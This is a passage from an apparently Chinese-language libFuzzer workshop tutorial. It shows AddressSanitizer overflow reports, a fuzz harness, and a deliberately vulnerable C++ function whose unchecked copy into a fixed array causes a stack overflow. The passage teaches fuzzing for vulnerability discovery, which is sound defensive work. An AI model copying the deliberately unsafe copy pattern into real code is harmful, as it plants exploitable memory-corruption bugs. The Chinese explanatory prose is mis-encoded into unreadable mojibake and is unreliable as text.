class="number">0</span> rss: <span class="number">29</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">=================================================================</span><br><span class="line">==<span class="number">9875</span>==ERROR: AddressSanitizer: heap-buffer-overflow on address <span class="number">0x60200005a1d3</span> at pc <span class="number">0x00000059b461</span> bp <span class="number">0x7ffd79c84880</span> sp <span class="number">0x7ffd79c84878</span></span><br><span class="line">READ of size <span class="number">1</span> at <span class="number">0x60200005a1d3</span> thread T0</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x59b460</span> in VulnerableFunction1(unsigned char <span class="keyword">const</span>*, unsigned long) /home/admin/libfuzzer-workshop/lessons/<span class="number">04</span>/./vulnerable_functions.h:<span class="number">22</span>:<span class="number">14</span></span><br><span class="line">    #<span class="number">1</span> <span class="number">0x59bde4</span> in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/<span class="number">04</span>/first_fuzzer.cc:<span class="number">10</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x466186</span> in fuzzer::Fuzzer::ExecuteCallback(unsigned char <span class="keyword">const</span>*, unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">556</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x46b7e9</span> in fuzzer::Fuzzer::RunOne(unsigned char <span class="keyword">const</span>*, unsigned long, <span class="type">bool</span>, fuzzer::InputInfo*, <span class="type">bool</span>*) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">470</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x46b7e9</span> in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">699</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x46e80f</span> in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">830</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x456b99</span> in fuzzer::FuzzerDriver(<span class="type">int</span>*, char***, <span class="type">int</span> (*)(unsigned char <span class="keyword">const</span>*, unsigned long)) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:<span class="number">824</span></span><br><span class="line">    #<span class="number">7</span> <span class="number">0x41f522</span> in main /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:<span class="number">19</span></span><br><span class="line">    #<span class="number">8</span> <span class="number">0x7fbfaac5abf6</span> in __libc_start_main (/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>+<span class="number">0x21bf6</span>)</span><br><span class="line">    #<span class="number">9</span> <span class="number">0x41f599</span> in _start (/home/admin/libfuzzer-workshop/lessons/<span class="number">04</span>/first_fuzzer+<span class="number">0x41f599</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">0x60200005a1d3</span> is located <span class="number">0</span> bytes to the right of <span class="number">3</span>-<span class="type">byte</span> region [<span class="number">0x60200005a1d0</span>,<span class="number">0x60200005a1d3</span>)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x597b58</span> in operator <span class="built_in">new</span>[](unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/asan/asan_new_delete.cpp:<span class="number">102</span></span><br><span class="line">    #<span class="number">1</span> <span class="number">0x466092</span> in fuzzer::Fuzzer::ExecuteCallback(unsigned char <span class="keyword">const</span>*, unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">541</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x46b7e9</span> in fuzzer::Fuzzer::RunOne(unsigned char <span class="keyword">const</span>*, unsigned long, <span class="type">bool</span>, fuzzer::InputInfo*, <span class="type">bool</span>*) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">470</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x46b7e9</span> in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">699</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x46e80f</span> in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">830</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x456b99</span> in fuzzer::FuzzerDriver(<span class="type">int</span>*, char***, <span class="type">int</span> (*)(unsigned char <span class="keyword">const</span>*, unsigned long)) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:<span class="number">824</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x41f522</span> in main /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:<span class="number">19</span></span><br><span class="line">    #<span class="number">7</span> <span class="number">0x7fbfaac5abf6</span> in __libc_start_main (/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>+<span class="number">0x21bf6</span>)</span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow /home/admin/libfuzzer-workshop/lessons/<span class="number">04</span>/./vulnerable_functions.h:<span class="number">22</span>:<span class="number">14</span> in VulnerableFunction1(unsigned char <span class="keyword">const</span>*, unsigned long)</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x0c04800033e0</span>: fa fa fd fa fa fa fd fd fa fa fd fd fa fa fd fd</span><br><span class="line">  <span class="number">0x0c04800033f0</span>: fa fa fd fd fa fa fd fa fa fa fd fa fa fa fd fd</span><br><span class="line">  <span class="number">0x0c0480003400</span>: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa</span><br><span class="line">  <span class="number">0x0c0480003410</span>: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa</span><br><span class="line">  <span class="number">0x0c0480003420</span>: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa</span><br><span class="line">=&gt;<span class="number">0x0c0480003430</span>: fa fa fd fa fa fa fd fa fa fa[<span class="number">03</span>]fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c0480003440</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c0480003450</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c0480003460</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c0480003470</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c0480003480</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow <span class="type">byte</span> legend (one shadow <span class="type">byte</span> represents <span class="number">8</span> application bytes):</span><br><span class="line">  Addressable:           <span class="number">00</span></span><br><span class="line">  Partially addressable: <span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after <span class="keyword">return</span>:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==<span class="number">9875</span>==ABORTING</span><br><span class="line">MS: <span class="number">1</span> EraseBytes-; base unit: aea2e3923af219a8956f626558ef32f30a914ebc</span><br><span class="line"><span class="number">0x46</span>,<span class="number">0x55</span>,<span class="number">0x5a</span>,</span><br><span class="line">FUZ</span><br><span class="line">artifact_prefix=<span class="string">&#x27;./&#x27;</span>; Test unit written to ./crash<span class="number">-0</span>eb8e4ed029b774d80f2b66408203801cb982a60</span><br><span class="line">Base64: RlVa</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„åœ°æ–¹æœ‰ç‚¹å¤š:<br>å‰é¢çš„å‡ è¡Œè¾“å‡ºfuzzerç›¸å…³çš„é€‰é¡¹å’Œé…ç½®ä¿¡æ¯ã€‚seed&#x3D;2222548757æ˜¯ç”Ÿæˆçš„éšæœºæ•°ç§å­ï¼Œå¯ä»¥åˆ©ç”¨<code>./first_fuzzer -seed=2222548757</code>æŒ‡å®šéšæœºç§å­ã€‚-max_lenä¸ºæµ‹è¯•è¾“å…¥çš„æœ€å¤§é•¿åº¦</p><p>ä»¥#å¼€å¤´çš„è¡¨ç¤ºåœ¨fuzzçš„è¿‡ç¨‹ä¸­è¦†ç›–çš„è·¯å¾„ä¿¡æ¯ã€‚<br><code>INITED</code> fuzzerå·²å®Œæˆåˆå§‹åŒ–ï¼Œå…¶ä¸­åŒ…æ‹¬é€šè¿‡è¢«æµ‹ä»£ç è¿è¡Œæ¯ä¸ªåˆå§‹è¾“å…¥æ ·æœ¬ã€‚<br><code>READ</code> fuzzerå·²ä»è¯­æ–™åº“ç›®å½•ä¸­è¯»å–äº†æ‰€æœ‰æä¾›çš„è¾“å…¥æ ·æœ¬ã€‚<br><code>NEW</code> fuzzeråˆ›å»ºäº†ä¸€ä¸ªæµ‹è¯•è¾“å…¥ï¼Œè¯¥è¾“å…¥æ¶µç›–äº†è¢«æµ‹ä»£ç çš„æ–°åŒºåŸŸã€‚æ­¤è¾“å…¥å°†ä¿å­˜åˆ°ä¸»è¦è¯­æ–™åº“ç›®å½•ã€‚<br><code>pulse</code> fuzzerå·²ç”Ÿæˆ 2çš„næ¬¡æ–¹ä¸ªè¾“å…¥ï¼ˆå®šæœŸç”Ÿæˆä»¥ä½¿ç”¨æˆ·ç¡®ä¿¡fuzzerä»åœ¨å·¥ä½œï¼‰ã€‚<br><code>REDUCE</code> fuzzerå‘ç°äº†ä¸€ä¸ªæ›´å¥½ï¼ˆæ›´å°ï¼‰çš„è¾“å…¥ï¼Œå¯ä»¥è§¦å‘å…ˆå‰å‘ç°çš„ç‰¹å¾ï¼ˆè®¾ç½®-reduce_inputs&#x3D;0ä»¥ç¦ç”¨ï¼‰ã€‚<br><code>cov</code> æ‰§è¡Œå½“å‰è¯­æ–™åº“æ‰€è¦†ç›–çš„ä»£ç å—æˆ–è¾¹çš„æ€»æ•°ã€‚<br><code>ft</code> libFuzzerä½¿ç”¨ä¸åŒçš„ä¿¡å·æ¥è¯„ä¼°ä»£ç è¦†ç›–ç‡ï¼šè¾¹ç¼˜è¦†ç›–ç‡ï¼Œè¾¹ç¼˜è®¡æ•°å™¨ï¼Œå€¼é…ç½®æ–‡ä»¶ï¼Œé—´æ¥è°ƒç”¨æ–¹&#x2F;è¢«è°ƒç”¨æ–¹å¯¹ç­‰ã€‚è¿™äº›ç»„åˆçš„ä¿¡å·ç§°ä¸ºåŠŸèƒ½ï¼ˆftï¼šï¼‰ã€‚<br><code>corp</code> å½“å‰å†…å­˜ä¸­æµ‹è¯•è¯­æ–™åº“ä¸­çš„æ¡ç›®æ•°åŠå…¶å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚<br><code>exec/s</code> æ¯ç§’æ¨¡ç³Šå™¨è¿­ä»£çš„æ¬¡æ•°ã€‚<br><code>rss</code> å½“å‰çš„å†…å­˜æ¶ˆè€—ã€‚<br><code>L</code> æ–°è¾“å…¥çš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚<br><code>MSï¼š&lt;n&gt; &lt;æ“ä½œ&gt;</code> è®¡æ•°å’Œç”¨äºç”Ÿæˆè¾“å…¥çš„å˜å¼‚æ“ä½œåˆ—è¡¨</p><p><code>#17458REDUCE cov: 7 ft: 7 corp: 5/14b lim: 170 exec/s: 0 rss: 29Mb L: 4/4 MS: 1 EraseBytes-</code><br>æŒ‡å°è¯•äº†17458ä¸ªè¾“å…¥ï¼ŒæˆåŠŸå‘ç°äº†5ä¸ªæ ·æœ¬ï¼ˆæ”¾å…¥è¯­æ–™åº“ï¼‰å¤§å°ä¸º14bï¼Œå…±è¦†ç›–äº†7ä¸ªä»£ç å—ï¼Œå ç”¨å†…å­˜29mbï¼Œå˜å¼‚æ“ä½œä¸ºEraseBytes-ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯å¼‚å¸¸æ£€æµ‹ç›¸å…³çš„ä¿¡æ¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">==9875==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200005a1d3 at pc 0x00000059b461 bp 0x7ffd79c84880 sp 0x7ffd79c84878</span><br><span class="line">READ of size 1 at 0x60200005a1d3 thread T0</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°AddressSanitizeræ£€æµ‹åˆ°å…¶ä¸­çš„ä¸€ä¸ªè¾“å…¥è§¦å‘äº†å †æº¢å‡ºï¼ˆheap-buffer-overflowï¼‰çš„æ¼æ´ã€‚<br>æ›´æ®é”™è¯¯ä¿¡æ¯ä¸­çš„<code> #0 0x59b460 in VulnerableFunction1(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/lessons/04/./vulnerable_functions.h:22:14</code>å¯ä»¥çœ‹åˆ°é”™è¯¯ç‚¹åœ¨<code>vulnerable_functions.h:22:14</code>ï¼Œå¯¹åº”<code>             data[3] == &#39;Z&#39;;</code>å³æ•°ç»„è¶Šç•Œçš„ä½ç½®ã€‚ä¸‹é¢çš„SUMMARYä¹Ÿä¸ä¹‹å¯¹åº”ã€‚</p><p>å€’æ•°ç¬¬äºŒè¡Œç»™å‡ºäº†é€ æˆcrashçš„è¾“å…¥ï¼Œå¹¶å°†å…¶å†™å…¥äº†crash-0eb8e4ed029b774d80f2b66408203801cb982a60ã€‚<br>å¤ç°crashå¯æ‰§è¡Œ<code>./first_fuzzer ./crash-0eb8e4ed029b774d80f2b66408203801cb982a60</code>ã€‚</p><p>è¿™æ ·fuzz tesingåŸºæœ¬ä¸Šå·²ç»å®Œæˆäº†ï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªé€ æˆç¨‹åºcrashçš„è¾“å…¥ï¼Œå¹¶å¾—çŸ¥å­˜åœ¨å †æº¢å‡ºçš„æ¼æ´ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æœ‰é’ˆå¯¹æ€§çš„å¯¹ç¨‹åºè¿›è¡ŒåŠ¨æ€è°ƒè¯•ï¼Œåˆ©ç”¨é€ æˆcrashçš„è¾“å…¥å›æº¯å‡ºæ¼æ´çš„ç»†èŠ‚ã€‚</p><p>ç»§ç»­fuzzå‡½æ•°VulnerableFunction2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">constexpr <span class="keyword">auto</span> kMagicHeader = <span class="string">&quot;ZN_2016&quot;</span>;</span><br><span class="line">constexpr <span class="built_in">std</span>::<span class="type">size_t</span> kMaxPacketLen = <span class="number">1024</span>;</span><br><span class="line">constexpr <span class="built_in">std</span>::<span class="type">size_t</span> kMaxBodyLength = <span class="number">1024</span> - <span class="keyword">sizeof</span>(kMagicHeader);</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">VulnerableFunction2</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size, <span class="type">bool</span> verify_hash)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (size &lt; <span class="keyword">sizeof</span>(kMagicHeader))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> <span class="title function_">header</span><span class="params">(reinterpret_cast&lt;<span class="type">const</span> <span class="type">char</span>*&gt;(data), <span class="keyword">sizeof</span>(kMagicHeader))</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="type">uint8_t</span>, kMaxBodyLength&gt; body;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(kMagicHeader, header.c_str()))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">auto</span> target_hash = data[--size];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size &gt; kMaxPacketLen)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!verify_hash)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::copy(data, data + size, body.data());</span><br><span class="line">  <span class="keyword">auto</span> real_hash = DummyHash(body);</span><br><span class="line">  <span class="keyword">return</span> real_hash == target_hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°å¤šäº†ä¸€ä¸ªboolå‚æ•°ï¼Œå› æ­¤æˆ‘ä»¬çš„çš„æ¥å£å‡½æ•°è¦æœ‰æ‰€æ”¹åŠ¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vulnerable_functions.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="type">bool</span> verify_hash_flags[] = &#123;<span class="literal">true</span>, <span class="literal">false</span>&#125;;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> flag : verify_hash_flags)</span><br><span class="line">VulnerableFunction2(data, size, flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ºäº†æé«˜fuzzå‡ºcrashçš„æ¦‚ç‡ï¼Œæˆ‘ä»¬è¦åˆ†åˆ«fuzz flagä¸ºtrueå’Œfalseçš„è¯·å†µï¼Œè€Œä¸åº”è¯¥æŠŠflagå†™æ­»ã€‚<br>æ¥ç€ç¼–è¯‘å¹¶æ‰§è¡Œå¾—åˆ°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">INFO: Seed: <span class="number">296692635</span></span><br><span class="line">INFO: Loaded <span class="number">1</span> modules   (<span class="number">37</span> inline <span class="number">8</span>-bit counters): <span class="number">37</span> [<span class="number">0x7f8160</span>, <span class="number">0x7f8185</span>), </span><br><span class="line">INFO: Loaded <span class="number">1</span> PC tables (<span class="number">37</span> PCs): <span class="number">37</span> [<span class="number">0x5b7d00</span>,<span class="number">0x5b7f50</span>), </span><br><span class="line">INFO:        <span class="number">0</span> files found in corpus2</span><br><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than <span class="number">4096</span> bytes</span><br><span class="line">INFO: A corpus is not provided, starting from an empty corpus</span><br><span class="line">#<span class="number">2</span>INITED cov: <span class="number">5</span> ft: <span class="number">6</span> corp: <span class="number">1</span>/<span class="number">1</span>b exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb</span><br><span class="line">#<span class="number">414</span>NEW    cov: <span class="number">6</span> ft: <span class="number">7</span> corp: <span class="number">2</span>/<span class="number">9</span>b lim: <span class="number">8</span> exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb L: <span class="number">8</span>/<span class="number">8</span> MS: <span class="number">2</span> ChangeByte-CrossOver-</span><br><span class="line">NEW_FUNC[<span class="number">1</span>/<span class="number">13</span>]: <span class="number">0x59bab0</span> in unsigned char* std::<span class="built_in">copy</span>&lt;unsigned char <span class="keyword">const</span>*, unsigned char*&gt;(unsigned char <span class="keyword">const</span>*, unsigned char <span class="keyword">const</span>*, unsigned char*) /usr/lib/gcc/x86_64-linux-gnu/<span class="number">7.5</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.5</span><span class="number">.0</span>/bits/stl_algobase.h:<span class="number">447</span></span><br><span class="line">NEW_FUNC[<span class="number">2</span>/<span class="number">13</span>]: <span class="number">0x59bb40</span> in std::array&lt;unsigned char, <span class="number">1016</span>ul&gt;::data() /usr/lib/gcc/x86_64-linux-gnu/<span class="number">7.5</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.5</span><span class="number">.0</span>/array:<span class="number">235</span></span><br><span class="line">#<span class="number">584</span>NEW    cov: <span class="number">24</span> ft: <span class="number">26</span> corp: <span class="number">3</span>/<span class="number">17</span>b lim: <span class="number">8</span> exec/s: <span class="number">0</span> rss: <span class="number">28</span>Mb L: <span class="number">8</span>/<span class="number">8</span> MS: <span class="number">5</span> CopyPart-CopyPart-ShuffleBytes-CrossOver-CMP- DE: <span class="string">&quot;ZN_2016&quot;</span>-</span><br><span class="line">#<span class="number">105505</span>NEW    cov: <span class="number">25</span> ft: <span class="number">27</span> corp: <span class="number">4</span>/<span class="number">1067</span>b lim: <span class="number">1050</span> exec/s: <span class="number">0</span> rss: <span class="number">47</span>Mb L: <span class="number">1050</span>/<span class="number">1050</span> MS: <span class="number">1</span> CrossOver-</span><br><span class="line">#<span class="number">106508</span>REDUCE cov: <span class="number">25</span> ft: <span class="number">27</span> corp: <span class="number">4</span>/<span class="number">1046</span>b lim: <span class="number">1050</span> exec/s: <span class="number">0</span> rss: <span class="number">48</span>Mb L: <span class="number">1029</span>/<span class="number">1029</span> MS: <span class="number">3</span> EraseBytes-ChangeBit-CopyPart-</span><br><span class="line">#<span class="number">108257</span>REDUCE cov: <span class="number">25</span> ft: <span class="number">27</span> corp: <span class="number">4</span>/<span class="number">1043</span>b lim: <span class="number">1060</span> exec/s: <span class="number">0</span> rss: <span class="number">49</span>Mb L: <span class="number">1026</span>/<span class="number">1026</span> MS: <span class="number">4</span> ChangeByte-ChangeByte-CrossOver-InsertRepeatedBytes-</span><br><span class="line">=================================================================</span><br><span class="line">==<span class="number">10468</span>==ERROR: AddressSanitizer: stack-buffer-overflow on address <span class="number">0x7fff31422548</span> at pc <span class="number">0x00000055286d</span> bp <span class="number">0x7fff31421f90</span> sp <span class="number">0x7fff31421740</span></span><br><span class="line">WRITE of size <span class="number">1023</span> at <span class="number">0x7fff31422548</span> thread T0</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x55286c</span> in __asan_memmove /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:<span class="number">30</span></span><br><span class="line">    #<span class="number">1</span> <span class="number">0x59c238</span> in unsigned char* std::__copy_move&lt;<span class="literal">false</span>, <span class="literal">true</span>, std::random_access_iterator_tag&gt;::__copy_m&lt;unsigned char&gt;(unsigned char <span class="keyword">const</span>*, unsigned char <span class="keyword">const</span>*, unsigned char*) /usr/lib/gcc/x86_64-linux-gnu/<span class="number">7.5</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.5</span><span class="number">.0</span>/bits/stl_algobase.h:<span class="number">368</span>:<span class="number">6</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x59c158</span> in unsigned char* std::__copy_move_a&lt;<span class="literal">false</span>, unsigned char <span class="keyword">const</span>*, unsigned char*&gt;(unsigned char <span class="keyword">const</span>*, unsigned char <span class="keyword">const</span>*, unsigned char*) /usr/lib/gcc/x86_64-linux-gnu/<span class="number">7.5</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.5</span><span class="number">.0</span>/bits/stl_algobase.h:<span class="number">385</span>:<span class="number">14</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x59c0b6</span> in unsigned char* std::__copy_move_a2&lt;<span class="literal">false</span>, unsigned char <span class="keyword">const</span>*, unsigned char*&gt;(unsigned char <span class="keyword">const</span>*, unsigned char <span class="keyword">const</span>*, unsigned char*) /usr/lib/gcc/x86_64-linux-gnu/<span class="number">7.5</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.5</span><span class="number">.0</span>/bits/stl_algobase.h:<span class="number">422</span>:<span class="number">18</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x59bb39</span> in unsigned char* std::<span class="built_in">copy</span>&lt;unsigned char <span class="keyword">const</span>*, unsigned char*&gt;(unsigned char <span class="keyword">const</span>*, unsigned char <span class="keyword">const</span>*, unsigned char*) /usr/lib/gcc/x86_64-linux-gnu/<span class="number">7.5</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.5</span><span class="number">.0</span>/bits/stl_algobase.h:<span class="number">454</span>:<span class="number">15</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x59b8b5</span> in VulnerableFunction2(unsigned char <span class="keyword">const</span>*, unsigned long, <span class="type">bool</span>) /home/admin/libfuzzer-workshop/lessons/<span class="number">04</span>/./vulnerable_functions.h:<span class="number">61</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x59bf63</span> in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/<span class="number">04</span>/second_fuzzer.cc:<span class="number">12</span>:<span class="number">2</span></span><br><span class="line">    #<span class="number">7</span> <span class="number">0x466186</span> in fuzzer::Fuzzer::ExecuteCallback(unsigned char <span class="keyword">const</span>*, unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">556</span></span><br><span class="line">    #<span class="number">8</span> <span class="number">0x46b7e9</span> in fuzzer::Fuzzer::RunOne(unsigned char <span class="keyword">const</span>*, unsigned long, <span class="type">bool</span>, fuzzer::InputInfo*, <span class="type">bool</span>*) 